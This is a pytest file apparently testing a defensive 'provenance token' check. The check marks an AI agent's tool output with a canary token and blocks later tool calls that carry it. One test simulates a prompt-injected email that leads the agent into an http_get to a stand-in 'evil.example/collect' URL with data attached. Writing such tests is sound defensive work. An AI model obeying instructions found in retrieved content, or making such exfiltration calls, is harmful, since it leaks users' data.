"""
test_provenance_token.py — Tests for the provenance token mechanism (Policy check 3)

Verifies that:
  1. A provenance token is injected into tool output returned to the agent
  2. If the provenance token appears in a later tool call's params, the PDP blocks it
  3. Normal agent behavior (no provenance token propagation) is not falsely blocked

No Ollama required.
"""

import pytest
from fastapi.testclient import TestClient

import sys
sys.path.insert(0, str(__file__.replace("/tests/test_provenance_token.py", "")))

from sensor import app, _active_provenance_tokens

client = TestClient(app)


def setup_function():
    client.post("/mode", json={"mode": "active"})
    _active_provenance_tokens.clear()


# ---------------------------------------------------------------------------
# Test 1: provenance token is injected into tool output
# ---------------------------------------------------------------------------

def test_provenance_token_is_injected_into_output():
    """
    When a tool call succeeds and returns output, the PDP injects a provenance
    token into the returned content. The agent sees this token; the user prompt
    did not contain it.
    """
    payload = {
        "call_id": "ptoken-test-inject",
        "tool": "read_email",
        "params": {"email_id": 1},
        "output": '{"id": 1, "body": "Hi team, Q3 review deadline is Friday."}',
    }
    resp = client.post("/check", json=payload)
    assert resp.status_code == 200
    result = resp.json()

    assert result["provenance_token"] is not None, "PDP should return the injected provenance token"
    assert result["redacted_output"] is not None, "PDP should return the token-injected output"
    assert result["provenance_token"] in result["redacted_output"], "Provenance token must appear in the output"
    assert "INTERNAL-MARKER-" in result["provenance_token"]


# ---------------------------------------------------------------------------
# Test 2: provenance token in subsequent call params → block
# ---------------------------------------------------------------------------

def test_provenance_token_in_subsequent_call_is_blocked():
    """
    Simulate injection: agent reads email (provenance token injected), then —
    influenced by the injected instruction — attempts to call http_get with the
    provenance token in params. The PDP must block this as evidence of LLM
    influence by retrieved content.
    """
    # Step 1: Read email — provenance token gets injected into output
    call_id = "ptoken-test-step1"
    payload1 = {
        "call_id": call_id,
        "tool": "read_email",
        "params": {"email_id": 4},
        "output": "Email body with injected instruction.",
    }
    resp1 = client.post("/check", json=payload1)
    assert resp1.status_code == 200
    result1 = resp1.json()
    provenance_token = result1["provenance_token"]
    assert provenance_token is not None

    # Step 2: Agent (influenced by retrieved content) calls http_get with provenance token in URL
    # This simulates the LLM copying content from retrieved email into a tool call
    payload2 = {
        "call_id": "ptoken-test-step2",
        "tool": "http_get",
        "params": {"url": f"evil.example/collect?token={provenance_token}&data=abc"},
        "output": None,
    }
    resp2 = client.post("/check", json=payload2)
    assert resp2.status_code == 200
    result2 = resp2.json()

    assert result2["verdict"] == "block", (
        f"PDP should block when provenance token appears in params. Got: {result2}"
    )
    assert result2["check_fired"] == "check_provenance_token"


def test_provenance_token_in_body_param_is_blocked():
    """Provenance token in a non-URL param (e.g., 'body') is also detected."""
    call_id = "ptoken-body-step1"
    payload1 = {
        "call_id": call_id,
        "tool": "read_email",
        "params": {"email_id": 2},
        "output": "Normal email content.",
    }
    resp1 = client.post("/check", json=payload1)
    provenance_token = resp1.json()["provenance_token"]
    assert provenance_token is not None

    payload2 = {
        "call_id": "ptoken-body-step2",
        "tool": "http_get",
        "params": {"url": "mail.internal/send", "body": f"Here is the data: {provenance_token}"},
        "output": None,
    }
    resp2 = client.post("/check", json=payload2)
    assert resp2.json()["verdict"] == "block"
    assert resp2.json()["check_fired"] == "check_provenance_token"


# ---------------------------------------------------------------------------
# Test 3: benign agent behavior does not trigger provenance token check
# ---------------------------------------------------------------------------

def test_benign_call_after_token_injection_is_not_blocked():
    """
    Normal agent making a follow-up call that doesn't include the provenance token
    is allowed. The check must not FP on unrelated params.
    """
    # Inject provenance token
    payload1 = {
        "call_id": "ptoken-benign-step1",
        "tool": "read_email",
        "params": {"email_id": 1},
        "output": "Clean email, no injection.",
    }
    resp1 = client.post("/check", json=payload1)
    assert resp1.json()["provenance_token"] is not None

    # Follow-up call with clean params — no provenance token present
    payload2 = {
        "call_id": "ptoken-benign-step2",
        "tool": "read_email",
        "params": {"email_id": 2},
        "output": None,
    }
    resp2 = client.post("/check", json=payload2)
    assert resp2.json()["verdict"] in ("allow",), (
        f"Benign follow-up call should not be blocked. Got: {resp2.json()}"
    )


def test_provenance_token_check_does_not_fp_on_partial_string():
    """
    Partial match (e.g., 'INTERNAL-MARKER' without the unique suffix) should not
    trigger. The check requires the full unique token.
    """
    # Inject a real provenance token
    payload1 = {
        "call_id": "ptoken-partial-step1",
        "tool": "read_email",
        "params": {"email_id": 3},
        "output": "Invoice email.",
    }
    resp1 = client.post("/check", json=payload1)
    provenance_token = resp1.json()["provenance_token"]
    assert provenance_token is not None

    # Call with generic 'INTERNAL-MARKER' prefix but not the actual token
    payload2 = {
        "call_id": "ptoken-partial-step2",
        "tool": "http_get",
        "params": {"url": "mail.internal/api?ref=INTERNAL-MARKER-0000"},
        "output": None,
    }
    resp2 = client.post("/check", json=payload2)
    # Should only block if the actual unique token is present, not a generic prefix
    # (token is 'INTERNAL-MARKER-XXXX' with a random hex suffix — 0000 is very likely different)
    if provenance_token != "INTERNAL-MARKER-0000":
        assert resp2.json()["verdict"] in ("allow",), (
            "Should not block on a different INTERNAL-MARKER token"
        )
